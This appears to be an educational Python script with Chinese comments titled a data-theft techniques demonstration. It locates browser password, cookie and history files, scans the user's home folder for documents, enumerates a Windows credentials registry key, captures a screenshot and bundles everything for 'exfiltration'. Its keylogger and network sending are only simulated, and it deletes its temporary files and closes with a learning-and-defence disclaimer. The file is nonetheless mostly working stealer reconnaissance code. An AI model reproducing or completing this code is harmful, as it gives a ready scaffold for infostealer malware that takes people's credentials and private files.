import os
import sys
import json
import hashlib
import time
from datetime import datetime
import getpass
import winreg
import shutil

class DataExfiltration:
    def __init__(self):
        self.stealing_techniques = [
            "键盘记录",
            "剪贴板监控",
            "浏览器数据窃取",
            "密码窃取",
            "文件窃取",
            "截图监控",
            "网络数据窃取",
            "邮件窃取"
        ]
    
    def get_system_info(self):
        """获取系统信息"""
        print("\n--- 获取系统信息 ---")
        
        try:
            import platform
            system_info = {
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": getpass.getuser(),
                "hostname": platform.node()
            }
            
            print(json.dumps(system_info, indent=2, ensure_ascii=False))
            return system_info
        except Exception as e:
            print(f"获取系统信息失败: {str(e)}")
            return None
    
    def steal_browser_data(self):
        """窃取浏览器数据"""
        print("\n--- 窃取浏览器数据 ---")
        
        try:
            # 浏览器数据路径
            browser_paths = {
                "Chrome": os.path.join(os.environ['APPDATA'], r"Google\Chrome\User Data\Default"),
                "Edge": os.path.join(os.environ['APPDATA'], r"Microsoft\Edge\User Data\Default"),
                "Firefox": os.path.join(os.environ['APPDATA'], r"Mozilla\Firefox\Profiles")
            }
            
            browser_data = {}
            
            for browser, path in browser_paths.items():
                if os.path.exists(path):
                    browser_data[browser] = {
                        "path": path,
                        "files": []
                    }
                    
                    # 查找关键文件
                    key_files = ["Login Data", "Cookies", "History", "Bookmarks"]
                    for file in key_files:
                        file_path = os.path.join(path, file)
                        if os.path.exists(file_path):
                            browser_data[browser]["files"].append({
                                "name": file,
                                "size": os.path.getsize(file_path),
                                "path": file_path
                            })
            
            print(json.dumps(browser_data, indent=2, ensure_ascii=False))
            return browser_data
        except Exception as e:
            print(f"窃取浏览器数据失败: {str(e)}")
            return None
    
    def steal_files(self, extensions=None, max_size=1024*1024):
        """窃取文件"""
        print("\n--- 窃取文件 ---")
        
        try:
            if extensions is None:
                extensions = [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".jpg", ".png"]
            
            stolen_files = []
            
            # 搜索用户目录
            user_dir = os.path.expanduser("~")
            
            for root, dirs, files in os.walk(user_dir):
                # 跳过某些目录
                dirs[:] = [d for d in dirs if d not in ["AppData", "Local Settings", "Program Files", "Program Files (x86)"]]
                
                for file in files:
                    if any(file.endswith(ext) for ext in extensions):
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size <= max_size:
                                # 计算文件哈希
                                hasher = hashlib.sha256()
                                with open(file_path, 'rb') as f:
                                    while chunk := f.read(8192):
                                        hasher.update(chunk)
                                
                                stolen_files.append({
                                    "name": file,
                                    "path": file_path,
                                    "size": file_size,
                                    "hash": hasher.hexdigest()
                                })
                        except Exception:
                            pass
            
            print(f"找到 {len(stolen_files)} 个文件")
            # 只显示前10个文件
            for file in stolen_files[:10]:
                print(f"  {file['name']} - {file['path']} - {file['size']} bytes")
            
            if len(stolen_files) > 10:
                print(f"  ... 还有 {len(stolen_files) - 10} 个文件")
            
            return stolen_files
        except Exception as e:
            print(f"窃取文件失败: {str(e)}")
            return None
    
    def steal_credentials(self):
        """窃取凭证"""
        print("\n--- 窃取凭证 ---")
        
        try:
            credentials = {}
            
            # 检查浏览器保存的密码
            browser_data = self.steal_browser_data()
            if browser_data:
                credentials["browser"] = browser_data
            
            # 检查Windows凭据管理器
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Credentials",
                    0,
                    winreg.KEY_READ
                )
                try:
                    i = 0
                    credential_list = []
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            credential_list.append(subkey_name)
                            i += 1
                        except OSError:
                            break
                    credentials["windows_credentials"] = credential_list
                finally:
                    winreg.CloseKey(key)
            except Exception as e:
                print(f"读取Windows凭据失败: {str(e)}")
            
            print(json.dumps(credentials, indent=2, ensure_ascii=False))
            return credentials
        except Exception as e:
            print(f"窃取凭证失败: {str(e)}")
            return None
    
    def simulate_keylogger(self):
        """模拟键盘记录器"""
        print("\n--- 模拟键盘记录器 ---")
        
        try:
            print("键盘记录器已启动，开始记录键盘输入...")
            print("请输入一些内容，然后按Enter键结束:")
            
            # 简单的键盘输入模拟
            input_text = input()
            print(f"记录的键盘输入: {input_text}")
            
            # 保存到文件
            log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(log_file, 'w') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {input_text}\n")
            
            print(f"键盘记录已保存到: {log_file}")
            
            # 清理测试文件
            if os.path.exists(log_file):
                os.remove(log_file)
            
            return input_text
        except Exception as e:
            print(f"模拟键盘记录器失败: {str(e)}")
            return None
    
    def take_screenshot(self):
        """截图"""
        print("\n--- 截图 ---")
        
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot_path = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            screenshot.save(screenshot_path)
            print(f"截图已保存到: {screenshot_path}")
            
            # 清理测试文件
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            
            return screenshot_path
        except Exception as e:
            print(f"截图失败: {str(e)}")
            return None
    
    def exfiltrate_data(self, data, method="file"):
        """数据窃取"""
        print("\n--- 数据窃取 ---")
        
        try:
            if method == "file":
                # 保存到本地文件
                exfil_file = f"exfiltrated_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(exfil_file, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                print(f"数据已保存到: {exfil_file}")
                
                # 清理测试文件
                if os.path.exists(exfil_file):
                    os.remove(exfil_file)
                
                return exfil_file
            elif method == "network":
                # 模拟网络传输
                print("模拟网络传输数据...")
                print(f"传输的数据大小: {len(json.dumps(data))} bytes")
                print("数据传输成功")
                return True
            else:
                print("不支持的窃取方法")
                return False
        except Exception as e:
            print(f"数据窃取失败: {str(e)}")
            return False
    
    def demonstrate_data_exfiltration(self):
        """演示数据窃取技术"""
        print("=== 数据窃取技术演示 ===")
        print("========================")
        
        # 1. 显示数据窃取技术列表
        print("\n1. 数据窃取技术列表:")
        for i, technique in enumerate(self.stealing_techniques, 1):
            print(f"   {i}. {technique}")
        
        # 2. 获取系统信息
        print("\n2. 获取系统信息:")
        system_info = self.get_system_info()
        
        # 3. 窃取浏览器数据
        print("\n3. 窃取浏览器数据:")
        browser_data = self.steal_browser_data()
        
        # 4. 窃取文件
        print("\n4. 窃取文件:")
        stolen_files = self.steal_files()
        
        # 5. 窃取凭证
        print("\n5. 窃取凭证:")
        credentials = self.steal_credentials()
        
        # 6. 模拟键盘记录
        print("\n6. 模拟键盘记录:")
        keylog_data = self.simulate_keylogger()
        
        # 7. 截图
        print("\n7. 截图:")
        screenshot = self.take_screenshot()
        
        # 8. 数据窃取
        print("\n8. 数据窃取:")
        exfil_data = {
            "system_info": system_info,
            "browser_data": browser_data,
            "stolen_files": stolen_files,
            "credentials": credentials,
            "keylog_data": keylog_data,
            "screenshot": screenshot,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # 保存到本地文件
        self.exfiltrate_data(exfil_data, "file")
        
        # 模拟网络传输
        self.exfiltrate_data(exfil_data, "network")
        
        print("\n=== 演示完成 ===")
        print("通过本演示，你了解了数据窃取的基本原理和实现方法。")
        print("请注意：这些技术仅用于学习和防御目的，请勿用于非法活动。")

if __name__ == "__main__":
    data_exfil = DataExfiltration()
    data_exfil.demonstrate_data_exfiltration()